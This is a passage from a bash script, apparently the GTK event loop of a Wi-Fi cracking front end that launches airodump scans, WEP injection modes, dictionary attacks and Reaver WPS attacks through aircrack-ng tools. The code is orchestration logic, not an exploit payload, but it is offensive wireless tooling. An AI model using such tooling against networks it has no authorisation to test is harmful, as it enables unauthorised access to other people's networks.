		gtk "u_enable $lanch"
		gtk "u_enable $reaver"
		gtk "u_enable $scan_button"
		echo "noaction">$path/task
	fi 
	if [ $EVENT = $dig_select_wep ];then
		rm -f $path/xd
		gtk "u_enable $WIN"
		gtk "u_hide $dig_select_wep"
		gtk "u_enable $lanch"
		#gtk "u_hide $reaver"
		gtk "u_hide $mkwpc"
		gtk "u_enable $scan_button"
		echo "noaction">$path/task
	fi 
	if [ $EVENT = $dig_select_wpa ];then
		rm -f $path/xd
		gtk "u_enable $WIN"
		gtk "u_hide $dig_select_wpa"
		gtk "u_enable $lanch"
		gtk "u_enable $reaver"
		gtk "u_enable $mkwpc"
		gtk "u_enable $scan_button"
		echo "noaction">$path/task
	fi 
	if [ $EVENT = $wep_wpa_combo ];then
		gtk "u_combo_grab $wep_wpa_combo"
		echo $GTK >$path/wep_wpa
		echo "wep_wpa is $GTK"
		if [ "$GTK" = "WPA/WPA2" ];then
			gtk "u_disable $frame1"
			gtk "u_disable $mode1"
			gtk "u_disable $mode2"
			gtk "u_disable $mode3"
			gtk "u_disable $mode4"
			gtk "u_disable $mode5"
			gtk "u_disable $mode6"
			gtk "u_disable $inject_rate_label"
			gtk "u_disable $injection_combo"
			gtk "u_show $dict_attack"
			gtk "u_show $reaver"
			gtk "u_show $mkwpc"
			gtk "u_hide $inject_rate_label"
			gtk "u_hide $injection_combo"
			define list_n gtk "u_list_get $airodump_list"
			echo $list_n >$path/list_n_wep	
			echo "wpa">$path/airodump_refresh
		fi
		if [ "$GTK" = "WEP" ];then
			gtk "u_enable $frame1"
			gtk "u_enable $mode1"
			gtk "u_enable $mode2"
			gtk "u_enable $mode3"
			gtk "u_enable $mode4"
			aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
			aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
			[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
			[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"
			if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
				gtk "u_enable $mode5"
				gtk "u_enable $mode6"
			fi
			gtk "u_enable $inject_rate_label"
			gtk "u_enable $injection_combo"
			gtk "u_hide $dict_attack"
			#gtk "u_hide $reaver"
			gtk "u_hide $mkwpc"
			gtk "u_show $inject_rate_label"
			gtk "u_show $injection_combo"
			define list_n gtk "u_list_get $airodump_list"
			echo $list_n >$path/list_n_wpa	
			echo "wep">$path/airodump_refresh
		fi
		
	fi
	if [ $EVENT = $ch_combo ];then
		gtk "u_combo_grab $ch_combo"
		echo $GTK >$path/ch
		echo "ch is $GTK"
	fi
	if [ $EVENT = $dict_attack ];then
		echo "dictionary attack is pressed"
		(bash /usr/local/bin/minileafdwep/dic_attack &) 
	fi
	if [ $EVENT = $scan_button ];then
		echo "scan_button is pressed"
		gtk "u_button_set $scan_button 0"
		gtk "u_label_text $ivs_label \"'$msg_17a 0'\""
		rm -f $path/scan* $path/list_n*
		gtk "u_disable $lanch"
		gtk "u_disable $reaver"
		echo "">$path/air_scan
		gtk "u_disable $frame1"
		gtk "u_disable $mode1"
		gtk "u_disable $mode2"
		gtk "u_disable $mode3"
		gtk "u_disable $mode4"
		gtk "u_disable $mode5"
		gtk "u_disable $mode6"
		gtk "u_combo_grab $cards_combo"
		if [ "$GTK" != "0" ];then
			echo $GTK >$path/interface_sel
		else
			interface=`head -1 $path/interface` 
			echo $interface >$path/interface_sel
		fi
		echo "GTK is $GTK"
		gtk "u_combo_grab $ch_combo"
		echo $GTK >$path/ch
		gtk "u_square gray 0 0 430 15 1"
		gtk "u_list_clear $output_list"
		rm -f $stdout $tmp_2 $tmp_3
		echo "1">$path/task
		if [ -e $path/first_scan ];then
			d1=`ps -ef|grep rtl8192cu`
			d2=`ps -ef|grep rtl8192ce`
			d3=`ps -ef|grep rtl8192de`
			d4=`ps -ef|grep rtl8192se`
			d5=`ps -ef|grep rt2500usb`
			if [ -n "$d1" ];then
				modprobe -r rtl8192cu
				modprobe rtl8192cu
				rm -rf $path/first_scan
			fi
			if [ -n "$d2" ];then
				modprobe -r rtl8192ce
				modprobe rtl8192ce
				rm -rf $path/first_scan
			fi
			if [ -n "$d3" ];then
				modprobe -r rtl8192de
				modprobe rtl8192de
				rm -rf $path/first_scan
			fi
			if [ -n "$d4" ];then
				modprobe -r rtl8192se
				modprobe rtl8192se
				rm -rf $path/first_scan
			fi
			if [ -n "$d5" ];then
				modprobe -r rt2500usb
				modprobe rt2500usb
				rm -rf $path/first_scan
			fi
		fi
		gtk "u_timeout $timer_button 500"
	fi
	if [ $EVENT = $timer_button ];then
		echo "time out"
		[ -s $path/task ]||echo "noaction">$path/task
		task_no=`head -1 $path/task`
		case $task_no in
			"1")
				echo "2">$path/task
				gtk "u_square green 0 0 45 15 1"
				;;
			 "2")
				echo "3">$path/task
				gtk "u_list_clear $airodump_list"
				;;
			"3")
				echo "4">$path/task
				gtk "u_list_text $airodump_list \"'Scanning...'\""
				gtk "u_focus $airodump_list"
				[ -s $path/lap_scan ]&&lap_scan=`head -1 $path/lap_scan`||lap_scan=3200
				if [ -n "$lap_scan" ];then
					 gtk "u_timeout $timer_button $lap_scan"
				else
					 gtk "u_timeout $timer_button 3200"
				fi
				echo "on">$path/airodump
				;;
			"4")
				echo "4 is on"
				echo "5">$path/task
				gtk "u_square green 0 0 90 15 1"
				;;
			"5")
				echo "6">$path/task
				gtk "u_square green 0 0 135 15 1"
				;;
			"6")
				echo "7">$path/task
				gtk "u_square green 0 0 180 15 1"
				;;
			"7")
				echo "8">$path/task
				gtk "u_square green 0 0 225 15 1"
				;;
			"8")
				echo "9">$path/task
				gtk "u_square green 0 0 270 15 1"
				;;
			"9")
				echo "10">$path/task
				gtk "u_square green 0 0 315 15 1"
				;;
			"10")
				echo "11">$path/task
				gtk "u_square green 0 0 360 15 1"
				;;
			"11")
				echo "12">$path/task
				gtk "u_square green 0 0 405 15 1"
				;;
			"12")
				echo "13">$path/task
				gtk "u_square green 0 0 430 15 1"
				;;
			"13")
				echo "16">$path/task
				scan_stop	
				gtk "u_timeout $timer_button 1000"
				;;
			"14")
				echo "task 14"
				gtk "u_timeout $timer_button 1000"
				if [ -e "$stdout" ];then
					gtk "u_list_clear $output_list"
					while read line
					do
						gtk "u_list_text $output_list \"'${line}'\""
					done<$stdout
				else
					gtk "u_list_clear $output_list"
					gtk "u_list_text $output_list \"'`now_time`$msg_55'\""
				fi				
				if [ -s $path/scan-01.cap -a ! -e $path/wpa_start ];then
					popup_data=`ivstools --convert $path/scan-01.cap $path/scan.ivs | grep 'Written' | awk -F ' ' '{print $2}' `
					[ -z "$popup_data" ]&&popup_data=0
					echo "popup is $popup_data"
					gtk "u_label_text $ivs_label \"'$msg_17a $popup_data'\""
					aircrack_start=`cat $path/aircrack_start`
					if [ $popup_data -gt 8000 -a $aircrack_start != "on" ];then
						echo "popup_data is greater than 8000"
						stdout "`now_time`$msg_44"
						echo "on">$path/aircrack_start
					fi
					if [ -s $tmp_2 ];then
						if [ -n "`cat $tmp_2|grep Sent|grep pps`" ];then
							stdout "`now_time`$msg_22a"
							rm -f $tmp_2
						fi
					fi
					if [ -s $tmp_3 ];then
						pps=`cat $tmp_3|awk -F '(' '{field=$NF};END{print field}'|awk '{print $1}'`
						if [ "$pps" != "0" -a -n "$pps" ];then
							stdout "`now_time`$msg_23a"
							rm -f $tmp_3
						fi
					fi
					if [ -s $tmp_6 ];then
						pps=`cat $tmp_6|awk -F '(' '{field=$NF};END{print field}'|awk '{print $1}'`
						if [ "$pps" != "0" -a -n "$pps" ];then
							stdout "`now_time`$msg_30a"
							rm -f $tmp_6
						fi
					fi
					if [ -s $tmp_7 ];then
						if [ -n "`cat $tmp_7|grep Sent|grep pps`" ];then
							stdout "`now_time`$msg_31a"
							rm -f $tmp_7
						fi
					fi
				fi
				if [ ! -e $path/wpa_start -a -s $path/keyfound ];then
					rm -f $path/disable_scan_button $path/disable_lanch
				fi
				;;
			"16")
				echo "task 16"
				echo "15">$path/task
				gtk "u_square gray 0 0 430 15 1"	
				;;
			"15")
				echo "task 15"
				gtk "u_timeout $timer_button 500"
				echo "noaction">$path/task
				rm -f $path/disable_scan_button $path/disable_lanch $path/disable_reaver
				if [ -s $path/airodump_output ];then
					gtk "u_list_clear $airodump_list"
					gtk "u_font $airodump_list \"'Arial 9'\""
					while read line
					do
						[ -n "${line}" ]&&gtk "u_list_text $airodump_list \"'$line'\""
					done <$path/airodump_output
					gtk "u_focus $airodump_list"
					if [ "`cat $path/wep_wpa`" = "WEP" ];then
						gtk "u_enable $frame1"
						gtk "u_enable $mode1"
						gtk "u_enable $mode2"
						gtk "u_enable $mode3"
						gtk "u_enable $mode4"
						aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
						aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
						[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
						[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"
						if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
							gtk "u_enable $mode5"
							gtk "u_enable $mode6"
						fi
					fi
				else
					gtk "u_list_clear $airodump_list"
				fi	
				gtk "u_focus $airodump_list"
				;;
			"noaction")
				gtk "u_list_clear $output_list"
				gtk "u_list_text $output_list \"'`now_time`$msg_12'\""
				echo "no action"
				gtk "u_timeout $timer_button 500"
				;;
		esac
	fi
#	if [ $EVENT = "key-press-event" ];then
#		define key gtk "u_key"
#		echo "$key is pressed"
#	fi
	if [ $EVENT = "button-release" ];then
		define mouse gtk "u_mouse 0"
		echo "$mouse is pressed"
		[ ! -e $path/lap_time ]&&echo "1">$path/lap_time
		lap_time=`head -1 $path/lap_time`
		lap_time=$[$lap_time + 1]
		echo "$lap_time">$path/lap_time
		if [ $lap_time -gt 5 ];then
			lap_time=1
			echo "1">$path/lap_time
		fi
		echo "lap_time is $lap_time"
		case "$lap_time" in
			"1")
				echo "3200">$path/lap_scan
				gtk "u_out \"'24'\" black gray 435 0"
				;;
			"2")
				echo "4000">$path/lap_scan
				gtk "u_out \"'36'\" black gray 435 0"
				;;
			"3")
				echo "5500">$path/lap_scan
				gtk "u_out \"'48'\" black gray 435 0"
				;;
			"4")
				echo "7000">$path/lap_scan
				gtk "u_out \"'60'\" black gray 435 0"
				;;
			"5")
				echo "11000">$path/lap_scan
				gtk "u_out \"'90'\" black gray 435 0"
				;;
		esac			
	fi
done
fi
gtk "u_end"
monitor_stop
if [ -n "`which NetworkManager`" ];then
	sudo /etc/init.d/NetworkManager start&
	sudo /etc/init.d/networkmanager start&
fi